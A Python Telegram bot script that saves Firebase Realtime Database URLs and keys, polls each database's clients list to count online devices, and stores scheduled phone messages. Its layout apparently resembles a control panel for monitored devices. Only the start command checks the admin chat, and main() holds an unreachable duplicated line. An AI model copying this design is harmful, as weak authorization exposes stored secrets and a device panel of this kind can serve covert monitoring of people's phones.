
import os
import json
import sqlite3
import asyncio
from datetime import datetime
from urllib.parse import quote

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler,
    ContextTypes, filters, ConversationHandler
)

BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", "0") or 0)
DB_PATH = os.getenv("DB_PATH", "whitegobinda_bot.db")
CHECK_TIMEOUT = 10

ADD_URL, ADD_KEY, NOTIFY_TO, NOTIFY_MSG, NOTIFY_DATE, NOTIFY_TIME = range(6)


def db():
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    con.execute("""CREATE TABLE IF NOT EXISTS accounts(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        url TEXT NOT NULL,
        secret TEXT DEFAULT '',
        created_at TEXT NOT NULL,
        UNIQUE(user_id,url)
    )""")
    con.execute("""CREATE TABLE IF NOT EXISTS schedules(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        recipient TEXT NOT NULL,
        message TEXT NOT NULL,
        run_at TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'scheduled',
        created_at TEXT NOT NULL
    )""")
    con.commit()
    return con


def normalize_url(url):
    return str(url or "").strip().rstrip("/")


async def firebase_clients(url, secret=""):
    url = normalize_url(url)
    params = {"auth": secret} if secret else {}
    timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT)
    async with aiohttp.ClientSession(timeout=timeout) as s:
        async with s.get(f"{url}/clients.json", params=params,
                         headers={"Accept": "application/json"}) as r:
            text = await r.text()
            if r.status != 200:
                raise RuntimeError(f"HTTP {r.status}")
            try:
                return json.loads(text)
            except json.JSONDecodeError:
                return None


def client_list(data):
    if not data:
        return []
    if isinstance(data, dict):
        out = []
        for k, v in data.items():
            if isinstance(v, dict):
                x = dict(v)
                x.setdefault("id", k)
                out.append(x)
        return out
    if isinstance(data, list):
        return [x for x in data if isinstance(x, dict)]
    return []


def menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 Firebase Accounts", callback_data="accounts"),
         InlineKeyboardButton("📱 Devices", callback_data="devices")],
        [InlineKeyboardButton("🔔 Notification Schedule", callback_data="notify")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
    ])


def authorized(update):
    return ADMIN_CHAT_ID == 0 or (update.effective_chat and update.effective_chat.id == ADMIN_CHAT_ID)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update):
        await update.message.reply_text("⛔ Unauthorized chat.")
        return
    await update.message.reply_text(
        "🤖 *WHITEGOBINDA BOT*\n\nFirebase account and device manager.",
        parse_mode="Markdown", reply_markup=menu()
    )


async def accounts(update, context):
    q = update.callback_query
    await q.answer()
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Account", callback_data="add_account")],
        [InlineKeyboardButton("📋 Saved Accounts", callback_data="saved_accounts")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="saved_accounts")],
        [InlineKeyboardButton("⬅️ Back", callback_data="home")]
    ])
    await q.edit_message_text("🔥 *Firebase Accounts*", parse_mode="Markdown",
                              reply_markup=kb)


async def saved_accounts(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    con = db()
    rows = con.execute("SELECT * FROM accounts WHERE user_id=? ORDER BY id DESC", (uid,)).fetchall()
    con.close()
    if not rows:
        text = "📋 *Saved Accounts*\n\nNo accounts saved."
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("➕ Add Account", callback_data="add_account")],
                                    [InlineKeyboardButton("⬅️ Back", callback_data="accounts")]])
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
        return

    buttons = []
    for row in rows:
        buttons.append([InlineKeyboardButton(f"🌐 {row['url'][:48]}",
                                              callback_data=f"acct:{row['id']}")])
    buttons.append([InlineKeyboardButton("⬅️ Back", callback_data="accounts")])
    await q.edit_message_text("📋 *Saved Accounts*", parse_mode="Markdown",
                              reply_markup=InlineKeyboardMarkup(buttons))


async def account_detail(update, context):
    q = update.callback_query
    await q.answer()
    aid = int(q.data.split(":")[1])
    con = db()
    row = con.execute("SELECT * FROM accounts WHERE id=? AND user_id=?",
                      (aid, q.from_user.id)).fetchone()
    con.close()
    if not row:
        await q.edit_message_text("Account not found.", reply_markup=menu())
        return

    try:
        data = await firebase_clients(row["url"], row["secret"])
        devices = client_list(data)
        online = sum(1 for x in devices if x.get("status"))
        state = f"🟢 Online: *{online}*\n📱 Total: *{len(devices)}*"
    except Exception as e:
        state = f"🔴 Offline / Error\n`{str(e)[:120]}`"

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Refresh", callback_data=f"acct:{aid}")],
        [InlineKeyboardButton("🗑 Delete", callback_data=f"del:{aid}")],
        [InlineKeyboardButton("⬅️ Back", callback_data="saved_accounts")]
    ])
    await q.edit_message_text(
        f"🌐 *Account*\n`{row['url']}`\n\n{state}",
        parse_mode="Markdown", reply_markup=kb
    )


async def delete_account(update, context):
    q = update.callback_query
    await q.answer()
    aid = int(q.data.split(":")[1])
    con = db()
    con.execute("DELETE FROM accounts WHERE id=? AND user_id=?", (aid, q.from_user.id))
    con.commit(); con.close()
    await q.edit_message_text("✅ Account deleted.", reply_markup=menu())


async def add_account_start(update, context):
    q = update.callback_query
    await q.answer()
    await q.edit_message_text(
        "➕ *Add Firebase Account*\n\nSend the Firebase RTDB URL:",
        parse_mode="Markdown"
    )
    return ADD_URL


async def add_url(update, context):
    url = normalize_url(update.message.text)
    if not url.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Invalid URL. Send a full https:// URL.")
        return ADD_URL
    context.user_data["add_url"] = url
    await update.message.reply_text(
        "🔐 Send database secret/key, or type `skip` if the database is public.",
        parse_mode="Markdown"
    )
    return ADD_KEY


async def add_key(update, context):
    key = update.message.text.strip()
    if key.lower() == "skip":
        key = ""
    url = context.user_data.get("add_url", "")
    try:
        await firebase_clients(url, key)
    except Exception as e:
        await update.message.reply_text(f"❌ Account check failed: {e}\n\nSend another URL.")
        return ADD_URL

    con = db()
    con.execute(
        "INSERT OR REPLACE INTO accounts(user_id,url,secret,created_at) VALUES(?,?,?,?)",
        (update.effective_user.id, url, key, datetime.now().isoformat(timespec="seconds"))
    )
    con.commit(); con.close()
    await update.message.reply_text("✅ Firebase account saved.", reply_markup=menu())
    return ConversationHandler.END


async def devices(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    con = db()
    rows = con.execute("SELECT * FROM accounts WHERE user_id=?", (uid,)).fetchall()
    con.close()
    if not rows:
        await q.edit_message_text("No saved Firebase accounts.", reply_markup=menu())
        return

    total = online = 0
    blocks = []
    for row in rows:
        try:
            data = await firebase_clients(row["url"], row["secret"])
            ds = client_list(data)
            on = sum(1 for x in ds if x.get("status"))
            total += len(ds); online += on
            blocks.append(f"🌐 `{row['url'][:42]}`\n🟢 {on} online / 📱 {len(ds)} total")
        except Exception:
            blocks.append(f"🌐 `{row['url'][:42]}`\n🔴 unavailable")

    await q.edit_message_text(
        f"📱 *Live Devices*\n\n🟢 Online: *{online}*\n📱 Total: *{total}*\n\n" +
        "\n\n".join(blocks),
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Refresh", callback_data="devices")],
            [InlineKeyboardButton("⬅️ Back", callback_data="home")]
        ])
    )


async def notify_start(update, context):
    q = update.callback_query
    await q.answer()
    await q.edit_message_text(
        "🔔 *Opt-in Notification Scheduler*\n\n"
        "This creates a saved schedule for an authorized/consenting recipient.\n\n"
        "Send recipient number:",
        parse_mode="Markdown"
    )
    return NOTIFY_TO


async def notify_to(update, context):
    context.user_data["notify_to"] = update.message.text.strip()
    await update.message.reply_text("💬 Send the notification message:")
    return NOTIFY_MSG


async def notify_msg(update, context):
    context.user_data["notify_msg"] = update.message.text.strip()
    await update.message.reply_text("📅 Send date in `YYYY-MM-DD` format:", parse_mode="Markdown")
    return NOTIFY_DATE


async def notify_date(update, context):
    value = update.message.text.strip()
    try:
        datetime.strptime(value, "%Y-%m-%d")
    except ValueError:
        await update.message.reply_text("❌ Invalid date. Use YYYY-MM-DD.")
        return NOTIFY_DATE
    context.user_data["notify_date"] = value
    await update.message.reply_text("⏰ Send time in `HH:MM` 24-hour format:", parse_mode="Markdown")
    return NOTIFY_TIME


async def notify_time(update, context):
    value = update.message.text.strip()
    try:
        datetime.strptime(value, "%H:%M")
        run_at = datetime.strptime(
            context.user_data["notify_date"] + " " + value, "%Y-%m-%d %H:%M"
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid time. Use HH:MM.")
        return NOTIFY_TIME

    if run_at <= datetime.now():
        await update.message.reply_text("❌ Date/time must be in the future.")
        return NOTIFY_DATE

    con = db()
    cur = con.execute(
        "INSERT INTO schedules(user_id,recipient,message,run_at,created_at) VALUES(?,?,?,?,?)",
        (update.effective_user.id, context.user_data["notify_to"],
         context.user_data["notify_msg"], run_at.isoformat(timespec="minutes"),
         datetime.now().isoformat(timespec="seconds"))
    )
    con.commit(); sid = cur.lastrowid; con.close()

    await update.message.reply_text(
        f"✅ *Schedule saved*\n\n"
        f"👤 Recipient: `{context.user_data['notify_to']}`\n"
        f"💬 Message: {context.user_data['notify_msg']}\n"
        f"📅 Date: `{context.user_data['notify_date']}`\n"
        f"⏰ Time: `{value}`\n"
        f"🆔 Schedule: `{sid}`",
        parse_mode="Markdown", reply_markup=menu()
    )
    context.user_data.clear()
    return ConversationHandler.END


async def status(update, context):
    q = update.callback_query
    await q.answer()
    con = db()
    a = con.execute("SELECT COUNT(*) FROM accounts WHERE user_id=?", (q.from_user.id,)).fetchone()[0]
    s = con.execute("SELECT COUNT(*) FROM schedules WHERE user_id=? AND status='scheduled'",
                    (q.from_user.id,)).fetchone()[0]
    con.close()
    await q.edit_message_text(
        f"📊 *Status*\n\n🔥 Accounts: *{a}*\n🔔 Saved schedules: *{s}*",
        parse_mode="Markdown", reply_markup=menu()
    )


async def settings(update, context):
    q = update.callback_query
    await q.answer()
    await q.edit_message_text(
        "⚙️ *Settings*\n\nWHITEGOBINDA Firebase Manager\nTimezone: server/local time",
        parse_mode="Markdown", reply_markup=menu()
    )


async def home(update, context):
    q = update.callback_query
    await q.answer()
    await q.edit_message_text("🤖 *WHITEGOBINDA BOT*", parse_mode="Markdown", reply_markup=menu())


def main():
    if not BOT_TOKEN:
        raise SystemExit("Set BOT_TOKEN environment variable first.")
    if not ADMIN_CHAT_ID:
        raise SystemExit("Set ADMIN_CHAT_ID environment variable first.")

        raise SystemExit("Set BOT_TOKEN environment variable first.")

    db()
    app = Application.builder().token(BOT_TOKEN).build()

    add_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(add_account_start, "^add_account$")],
        states={
            ADD_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_url)],
            ADD_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_key)],
        },
        fallbacks=[],
    )
    notify_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(notify_start, "^notify$")],
        states={
            NOTIFY_TO: [MessageHandler(filters.TEXT & ~filters.COMMAND, notify_to)],
            NOTIFY_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, notify_msg)],
            NOTIFY_DATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, notify_date)],
            NOTIFY_TIME: [MessageHandler(filters.TEXT & ~filters.COMMAND, notify_time)],
        },
        fallbacks=[],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(add_conv)
    app.add_handler(notify_conv)
    app.add_handler(CallbackQueryHandler(accounts, "^accounts$"))
    app.add_handler(CallbackQueryHandler(saved_accounts, "^saved_accounts$"))
    app.add_handler(CallbackQueryHandler(account_detail, "^acct:\\d+$"))
    app.add_handler(CallbackQueryHandler(delete_account, "^del:\\d+$"))
    app.add_handler(CallbackQueryHandler(devices, "^devices$"))
    app.add_handler(CallbackQueryHandler(status, "^status$"))
    app.add_handler(CallbackQueryHandler(settings, "^settings$"))
    app.add_handler(CallbackQueryHandler(home, "^home$"))
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
